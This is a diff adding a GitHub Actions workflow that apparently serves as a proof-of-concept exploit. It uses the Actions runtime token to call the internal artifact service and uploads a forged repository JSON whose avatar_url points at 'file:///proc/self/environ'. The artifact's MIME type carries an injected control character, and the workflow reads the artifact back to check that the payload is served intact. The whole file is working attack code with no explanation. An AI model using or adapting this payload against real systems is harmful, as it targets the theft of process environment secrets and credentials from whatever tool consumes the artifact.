@@ -1,0 +1,65 @@
+name: Repo Cassette single payload artifact
+on:
+  workflow_dispatch:
+permissions:
+  actions: read
+jobs:
+  payload:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v8
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+        with:
+          script: |
+            const {createHash} = require('node:crypto');
+            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            if (!runtime || !resultsUrl) throw new Error('Actions runtime artifact credentials unavailable');
+            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
+            if (!scope) throw new Error('Actions.Results scope unavailable');
+            const [, runId, jobId] = scope.split(':');
+            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
+            const endpoint = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const mime = 'application/json\u0085';
+            const name = `cassette-${process.env.GITHUB_RUN_ID}`;
+            async function rpc(method, body) {
+              const r = await fetch(endpoint + method, {method:'POST', headers:{Authorization:`Bearer ${runtime}`, 'Content-Type':'application/json'}, body:JSON.stringify(body)});
+              const data = await r.json().catch(() => ({}));
+              if (!r.ok || data.ok !== true) throw new Error(`${method} failed HTTP ${r.status}`);
+              return data;
+            }
+            const created = await rpc('CreateArtifact', {...ids, name, version:7, mime_type:mime});
+            const uploadUrl = created.signed_upload_url || created.signedUploadUrl;
+            if (!uploadUrl) throw new Error('No artifact upload URL');
+            async function put(bytes) {
+              const r = await fetch(uploadUrl, {method:'PUT', headers:{'x-ms-blob-type':'BlockBlob', 'x-ms-version':'2023-11-03', 'x-ms-blob-content-type':mime, 'Content-Type':'application/octet-stream'}, body:bytes});
+              if (!r.ok) throw new Error(`Artifact blob PUT failed HTTP ${r.status}`);
+            }
+            const repo = process.env.GITHUB_REPOSITORY;
+            const make = id => Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`, owner:{login:repo.split('/')[0], avatar_url:'file:///proc/self/environ'}}));
+            const placeholder = make('00000000000');
+            await put(placeholder);
+            const hash = 'sha256:' + createHash('sha256').update(placeholder).digest('hex');
+            const finalized = await rpc('FinalizeArtifact', {...ids, name, size:String(placeholder.length), hash});
+            const artifactId = String(finalized.artifact_id || finalized.artifactId || '');
+            if (!/^\d+$/.test(artifactId)) throw new Error('No numeric artifact ID');
+            const payload = make(artifactId);
+            await put(payload);
+            const download = `https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`;
+            const redirect = await fetch(download, {headers:{Authorization:`Bearer ${process.env.GITHUB_TOKEN}`, Accept:'application/vnd.github+json'}, redirect:'manual'});
+            const location = redirect.headers.get('location');
+            if (redirect.status !== 302 || !location) throw new Error(`Artifact download endpoint HTTP ${redirect.status}`);
+            const response = await fetch(location);
+            const bytes = Buffer.from(await response.arrayBuffer());
+            const type = response.headers.get('content-type') || '';
+            const sha = b => createHash('sha256').update(b).digest('hex');
+            core.info(`ARTIFACT_ID=${artifactId}`);
+            core.info(`PAYLOAD_BYTES=${payload.length} PAYLOAD_SHA256=${sha(payload)}`);
+            core.info(`DOWNLOAD_STATUS=${response.status} MIME_LATIN1_HEX=${Buffer.from(type,'latin1').toString('hex')}`);
+            core.info(`BODY_BYTES=${bytes.length} BODY_SHA256=${sha(bytes)} BODY_MATCH=${bytes.equals(payload)}`);
+            core.summary.addHeading('Payload artifact readback').addTable([['Field','Value'],['Artifact ID',artifactId],['Download status',String(response.status)],['Content-Type bytes (hex)',Buffer.from(type,'latin1').toString('hex')],['Payload SHA-256',sha(payload)],['Body SHA-256',sha(bytes)],['Exact body match',String(bytes.equals(payload))]]);
+            await core.summary.write();
+            if (!response.ok) throw new Error(`Artifact readback HTTP ${response.status}`);
+
